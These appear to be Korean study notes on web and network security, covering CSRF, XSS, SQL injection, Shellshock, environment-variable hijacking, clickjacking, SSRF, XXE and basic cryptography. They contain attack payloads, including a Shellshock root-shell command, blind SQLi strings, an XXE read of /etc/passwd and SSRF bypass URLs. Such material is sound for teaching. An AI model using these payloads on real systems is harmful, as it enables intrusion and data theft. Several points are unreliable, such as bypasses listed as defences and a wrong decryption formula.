---
title: "네트워크 및 웹 보안"
date: 2024-03-11
---

## Web Security Model

### Web 보안의 목표
- Integirty : 무결성
- Confidentiality : 기밀성

### HTTP
- URL
  > https:// www.example.edu :80 /lectures ?lec=80 #slides 
  > protocol + hostname + port + path + query + fragment

### Cookies
> 서버가 웹 브라우저에게 보내는 정보

- 역할 : 세션 관리, 사용자 설정 저장, 사용자 추적 등

```text
// 쿠키 설정
Set-Cookie: name=value;
// 쿠키 전송
Cookie: name=value;
```

### Same Origin Policy (SOP)
> 같은 Origin에서만 리소스를 공유할 수 있도록 한다

- Origin
  > scheme://domain:port

#### Domain Relaxation
> 서브 도메인 간의 리소스 공유

- document.domain을 수정하여, 서브 도메인 간의 리소스 공유 가능
- 예시
  ```text
  a.domain.com -> domain.com 가능
  a.domain.com -> b.domain.com 불가능
  a.domain.com -> com 불가능
  ```

- 취약점 : 악의적인 사이트가 document.domain을 수정하여 접근을 시도할 수 있음
- 해결방법 : Mozilla Public Suffix List (PSL) 사용

#### BroadcastChannel API
> 같은 origin의 다른 context 간의 통신

- 사용법
  ```js
  const bc = new BroadcastChannel('channel');
  bc.postMessage('message');
  bc.onmessage = (e) => console.log(e.data);
  ```
### XMLHttpRequest (XHR)
> 서버와 비동기 통신을 위한 객체

### CORS (Cross-Origin Resource Sharing)
> 다른 Origin의 리소스를 요청할 때, 서버에서 허용하는 정책

### Cookie
> 서버가 클라이언트에게 보내는 정보

#### Cookie Scoping
- Domain
  > 해당 도메인은 Subdomain 또는 Parent Domain에 대해서만 쿠키를 전송
- Path
  > 해당 경로의 하위 경로까지 쿠키를 전송

#### Secure Cookies
> HTTPS 프로토콜을 사용할 때만 쿠키를 전송
```text
Set-Cookie: name=value; Secure
```

#### HTTPOnly Cookies
> JavaScript에서 쿠키에 접근할 수 없도록 함
```text
Set-Cookie: name=value; HttpOnly
```

## CSRF (Cross Site Request Forgery)

> 다른 사이트에서 요청을 위조하여 공격하는 기법

#### 배경

- 특정 사용자가 로그인된 상태라면, 사용자를 확인하기 위해 브라우저에서 쿠키와 함께 요청을 전송
- cross-site에서도 쿠키와 함께 요청을 보냈을때, 서버가 same-site인지 cross-site인지 확인이 불가한 경우 **CSRF 공격 가능**

#### 예상 시나리오

- 피해자가 현재 로그인된 상태로 Malicious Site에 접속
- Malicious site에서 피해자 의지와 상관없이 쿠키와 함께 요청을 전송
- GET 예시 코드
  ```html
  <img src="http://bank.com/transfer?to=attacker&amount=1000" />
  ```
- POST 예시 코드
  ```html
  <form action="http://bank.com/transfer" method="post">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="1000" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
  ```

#### 방어

- Referer Header
  > 요청을 보낸 페이지의 주소를 나타내는 HTTP header를 확인하여, 요청을 보낸 페이지가 같은 사이트인지 확인
  ```text
  Referer: http://www.example.com
  ```
  - 한계
    - 해당 field를 이용해서 접속 기록을 확인 가능 -> 개인정보 보호 문제
- Same-Site Cookies
  > 서버가 쿠키를 전송할 때, `SameSite`라는 쿠키 속성를 전송, same-site인지 cross-site인지 확인하여, 설정값에 따라 쿠키를 전송하지 않음
  - 설정 값
    - None (모든 요청에 쿠키 전송)
    - Strict (cross-site는 항상 쿠키 전송하지 않음)
    - Lax (cross-site는 GET 요청시에만 쿠키 전송하지 않음)
- Secret Token
  > 특정 origin의 첫 요청때, 특정한 토큰을 생성, 이후 요청시 해당 토큰을 함께 전송하여, 요청이 같은 Origin에서 온 것인지 확인
  - Bypassing with Clickjacking
    > 사용자가 의도하지 않은 클릭을 유도하여, CSRF 공격을 수행하는 기법
    - 방어
      - X-Frame-Options Header (값 : DENY, SAMEORIGIN, ALLOW-FROM uri)
        > 해당 페이지를 iframe으로 렌더링하는 것을 방지

## XSS(Cross Site Scripting) Attack

### Non-persistent (Reflected) XSS Attack
> 사용자의 입력값을 그대로 출력하여, 공격자가 스크립트를 삽입하여 공격하는 기법

- 예시
  1. query string을 실행하는 페이지가 존재 (innerHTML)
  2. 피해자가 해당 링크를 실행 => http://www.example.com/search?input=<script>alert(“attack”);</script>
  3. 피해자의 브라우저에서 alert가 실행됨

### Persistent (Stored) XSS Attack
> 사용자의 입력값을 DB에 저장하여, 공격자가 스크립트를 삽입하여 공격하는 기법

- 예시
  1. 게시판에 글을 작성하는 페이지가 존재
  2. 피해자가 해당 페이지에 스크립트를 삽입하여 글을 작성
  3. 다른 사용자가 해당 글을 읽을 때, 스크립트가 실행됨

### XSS로 발생 가능한 피해
- Web defacing(웹페이지 변조)
- Spoofing requests(사용자의 요청 변조)
- Stealing information(정보 탈취)

### Self-Propagation XSS Worm
> XSS 공격을 통해, 자동으로 공격을 전파하는 기법

- 2가지 접근
  - DOM Approach
  ```js
  let jsCode = document.getElementById('worm').innerHTML;
  ```
  - Link Approach
  ```js
  let jsCode = '<script src="http://www.example.com/worm.js"></script>';
  ```

### 방어
- 입력값 필터링 : 사용자의 입력값을 필터링하여, 스크립트를 실행하지 않도록 한다
- Encoding : 사용자의 입력값을 출력할 때, HTML Encoding하여, 스크립트를 실행하지 않도록 한다
- Content Security Policy (CSP) : 웹페이지에서 실행 가능한 리소스를 제한하여, XSS 공격을 방어한다
  - 예시 (script 파일)
  ```html
  Content-Security-Policy: script-src 'self' example.com
  ```
  - 예시 (inline script)
  ```html
  Content-Security-Policy: script-src 'nonce-2726c7f26c'
  // allowed script
  <script nonce=2726c7f26c> ... </script>
  // not allowed script
  <script nonce=42eh44jhad> ... </script>
  ```

## SQL Injection

> SQL 쿼리를 조작하여, DB에 대한 공격을 수행하는 기법

### 예시
- EID에 "EID5002'#"을 삽입 -> PASSWORD 검증을 우증
```sql
SELECT NAME, SALERY, SSN
FROM EMPLOYEE
WHERE EID='EID5002'#' AND PASSWORD='1234';
```

- curl을 이용해서 SQL Injection 공격
```bash
curl 'www.example.com/getdata.php?EID=a' OR 1=1&PASSWORD='
```

### 방어
#### Filtering and Encoding data
  > SQL Injection에서 쓰이는 특수문자를 Filtering, Encoding

```php
$mysqli->real_escape_string($input);
```
- 한계
  - 필요한 문자열을 필터링할 수 있음

#### Prepared Statements
> SQL 쿼리를 미리 준비하여, 사용자의 입력값을 삽입하지 않고, 쿼리를 실행

```php
$stmt = $mysqli->prepare("SELECT NAME, SALARY, SSN FROM EMPLOYEE WHERE EID=? AND PASSWORD=?");
// ss means "string string"
$stmt->bind_param("ss", $EID, $PASSWORD);
$stmt->execute();
```

### Blind SQL Injection
> SQL Injection 공격을 통해, DB에 대한 정보를 탈취하는 기법

1. Conditional Response
```sql
/* Password의 첫번째 문자가 'm'보다 큰지 확인 */ 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
/* Password의 첫번째 문자가 't'보다 큰지 확인 */
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
2. SQL Error - Divide by Zero

```sql
/* Password의 첫번째 문자가 'm'보다 크면 오류 발생 */
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) >
'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

3. SQL Error  - Cast
```sql
/* Password의 첫번째 문자가 'm'보다 크면 오류 발생 */
CAST((SELECT example_column FROM example_table) AS int)
```

4. Time Delay
```sql
/* Password의 첫번째 문자가 'm'보다 크면 딜레이 발생 */
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND
SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-
```

## ShellShock Attack
> bash 쉘의 취약점을 이용하여, 공격하는 기법

### Set-UID Programs
> Set-UID root 권한을 가진 프로그램이 system함수를 호출할 때, 공격하는 기법
- RUID : Real User ID : 프로그램을 실행한 사용자의 권한
- EUID : Effective User ID : 프로그램이 실행되는 권한
- Set-UID Program : 사용자가 프로그램을 root 권한으로 실행할 수 있도록 하는 프로그램, RUID와 EUID가 다름, 
- Set-UID Program을 만드는 방법
  ```bash
  $ sudo chown root vul
  $ sudo chmod 4755 vul
  $ ls -l vul
  -rwsr-xr-x 1 root root 1234 Mar 11 12:00 vul # s가 존재
  ```
- 취약한 C 프로그램 (vul : Set-UID program)
  ```c
  #include <stdio.h>
  void main() {
    setuid(geteuid()); // root 권한을 가진 사용자로 설정
    system("/bin/ls -l"); // ls -l 명령어 실행
  }
  ```
- 공격 명령어
  ```bash
  $ export foo='() { echo "hello"; }; /bin/sh'
  $ ./vul
  ```

### CGI(Common Gateway Interface) Programs
> 웹 서버에서 사용하는 CGI 프로그램에 대한 취약점

- 취약한 CGI 프로그램 (test.cgi)
  ```bash
  #!/bin/bash
  echo "Content-type: text/plain"
  echo
  echo "Hello, World!"
  ```
- 공격 명령어
  ```bash
  $ curl http://10.0.2.69/cgi-bin/test.cgi
  Hello, World!
  ```
- 공격을 활용하는 방법
  1. 설정 파일에 하드코딩된 db password 탈취
  2. reverse shell 실행
 
## Environment Variables & Attacks
- 프로세스가 환경변수를 얻는 방법
  1. fork() : 자식을 생성, 자식이 부모의 환경변수를 상속
  2. execve() : 새로운 프로그램을 자식으로 실행, 새로 환경변수를 설정

### Attacks via Dynamic Linker
> 링크된 라이브러리를 조작하여, 공격하는 기법
- 원리
  1. LD_PRELOAD는 공유 라이브러리의 목록을 저장
  2. 함수를 찾지 못하면, LD_LIBRARY_PATH에서 찾음
  3. 두 변수를 조작하여 링크된 라이브러리를 조작
- 예시
  ```bash
  $ export LD_PRELOAD=/path/to/malicious.so
  $ ./vul
  ```

### Attacks via Execution Program
> 실행 프로그램을 조작하여, 공격하는 기법

- 예시
  ```bash
  $ export PATH=/path/to/malicious:$PATH
  $ ./vul
  # // root shell 취득
  ```

### Attacks via Library
> format string 등의 취약점을 이용하여 공격하는 기법

### Attacks via Application Code
> buffer overflow 등의 취약점을 이용하여 공격하는 기법

### Set-UID Approach VS Service Approach


## Clickjacking Attack
> 사용자의 의도와 상관없이 클릭을 유도하여, 공격하는 기법

```html
<iframe id="top" src="http://www.attack.com" style="opacity: 0"></iframe>
<iframe id="bottom" src="http://www.example.com>" style="opacity: 1"></iframe>
```

### 방어
#### Client-side (Framekiller and Framebuster)
> javascript를 이용하여, 해당 페이지가 iframe으로 렌더링되는 것을 방지
```js
if (top != self)
if (top.location != self.location)
...
```
- 한계
  - 우회할 수 있는 방법이 많아서 불안정 -> 잘 쓰지 않는다
- 우회
  1. Double framing : 두개의 iframe을 사용하여, 첫번째 iframe을 숨기고, 두번째 iframe을 보여줌
  2. Abusing onBeforeUnload : 사용자가 페이지를 떠날 때, alert을 띄워서, 사용자의 클릭을 유도
  3. sandbox attribute : iframe에 sandbox attribute를 사용하여, 해당 iframe에서는 스크립트를 실행하지 않도록 함
    - options
      1. allow-same-origin
      2. allow-scripts
      3. allow-forms
      4. allow-modals
      5. allow-top-navigation
    - 예시
      ```html
      <iframe ... sandbox="allow_forms allow-scripts"></iframe>
      ```
- Referrer checking problems
    > Referer를 확인하여 특정 도메인의 사이트만 iframe으로 렌더링되었는지 확인
    - 한계 : Referer를 조작하여 우회 가능

#### Server-side
- X-Frame-Options
  > 특정 ORIGIN 페이지에서만 해당 페이지를 iframe으로 렌더링할 수 있도록 함
  - 예시
    ```c
    X-Frame-Options: DENY // 해당 페이지를 iframe으로 렌더링하지 않음
    X-Frame-Options: SAMEORIGIN // 같은 ORIGIN 페이지에서만 해당 페이지를 iframe으로 렌더링
    X-Frame-Options: ALLOW-FROM uri // 특정 uri에서만 해당 페이지를 iframe으로 렌더링
    ```
  - Outdated : CSP 사용 권장

- Content Security Policy (CSP)
  > 웹페이지에서 실행 가능한 리소스를 제한
  - script-src : 스크립트 source를 제한
  - img-src : 이미지의 source를 제한
  - frame-ancestors : `<frame>`, `<iframe>`, `<object>`, `<embed>` 또는 `<applet>` 요소의 부모를 제한
  - 예시
    ```php
    $csp = "Content-Security-Policy: frame-ancestors *";
    header($csp);
    ```

### Types of Context Integrity
#### Visual Integrity
> 보이는 것과 실제로 실행되는 것의 차이에 대한 무결성
  - 방어를 위한 방법 : User Confirmation, UI Randomization, Visibility Detection on Click
#### Temporary Integrity
> 사용자 확인 시점과 클릭 시작 시점 사이의 UI 상태 차이에 대한 무결성
  - 방어를 위한 방법 : Access Control Gadgets

## SSRF (Server Side Request Forgery)

> 서버에서 다른 서버로 요청을 보내는 공격 기법

### 공격 (서버가 신뢰된 서버에서 요청이 온 것으로 착각)
```text
POST /product/stock HTTP/1.0
Content-Type: application/www-form-urlencoded
Content-Length: 30

stockApi=http://localhost/admin
```

### 방어
- 차단된 문자열을 URL 인코딩 또는 대소문자 변형을 통해 숨김
- 서로 다른 프로토콜을 사용하여, 요청을 보냄
- using @
```text
https://expected-host:fakepassword@evil-host
```
- using #
```text
https://evil-host#expected-host
```
- Rogue DNS
```text
https://expected-host.evil-host
```
- Double encoding : `# -> %23 -> %2523`

### XXE (XML eXternal Entity) Injection
> XML 파싱 과정에서 발생하는 취약점을 이용하여, 공격하는 기법

- XML custom entity
  > XML에서 사용자가 정의한 엔티티를 사용하여, 재사용 가능한 문자열을 정의

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE message [<!ENTITY greeting "Hello, ">]>
  <message>
    <text>&greeting;world!</text>
  </message>
  ```

- Access internal file
  > XML 엔티티를 이용하여, 서버의 파일을 읽어오는 공격

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <stockCheck><productId>&xxe;</productId></stockCheck>
  ```

- With SSRF
  > SSRF와 결합하여, 외부 서버로 요청을 보내는 공격

  ```xml
  <!DOCTYPE foo[<!ENTITY xxe SYSTEM "http://localhost/admin">]>
  ```

## 암호기술

### 전통적인 암호기술

#### 암호의 정의

- 암호를 사용하는 목적
  1. 기밀성 (Confidentiality) : 정보가 노출되지 않아야함
  2. 자료의 무결성 (Data Integrity) : 데이터가 위변조되면 안됨
  3. 인증 (Authentication) : 정보의 출처가 정당해야함
  4. 부인방지 (Non-repudiation) : 사용자가 이를 거부하지 않아야함

- 암호 알고리즘의 기본 조건 (K : Key, M : Message, C : Cipher Text)
  - 암호화 : E(K, M) = C
  - 복호화 : D(K, C) = C
  - E(K, M)과 D(K, C)의 계산은 쉬워야 함
  - K를 모를때 C에서 M을 계산하는 것은 어려워야 함

- 암호 해독 방법
  1. Cipher Text Only Attack : 암호문만을 이용하여 평문을 찾는 공격
  2. Known Plain Text Attack : 암호문과 평문을 이용하여 키를 찾는 공격
  3. Chosen Plain Text Attack : 평문을 선택하여 암호문을 찾는 공격

#### 암호의 종류
1. 대칭키(비밀키)(관용키) 암호
  > 암호화와 복호화에 같은 키를 사용하는 암호
  - 사용자 n명에 따라 필요한 키의 개수 : n(n-1)/2
  - 암호 알고리즘의 종류
    - 블록 암호 (DES, IDEA, AES)
      > 평문을 블록으로 나누어 암호화하는 방식
    - 스트림 암호 (RC4)
      > 평문과 키를 비트 단위로 XOR하여 암호화하는 방식
  - 한국에서 쓰는 알고리즘 종류 : NEAT, SEED, NES, ARIA
2. 공개키(비대칭키) 암호
  > 암호화와 복호화에 다른 키를 사용하는 암호
  - 사용자 n명에 따라 필요한 키의 개수 : 2n
  - 기밀성 (Confidentiality) : 공개키로 암호화, 개인키로 복호화
  - 인증 (Authentication) : 개인키로 암호화, 공개키로 복호화
  - 키 생성
  - DH 키 교환

### 암호기술의 활용
#### 디지털 서명
- 특성 : 위조불가, 변경 불가, 서명자 인증, 재사용 불가, 부인 방지

### 동형암호와 양자암호 기술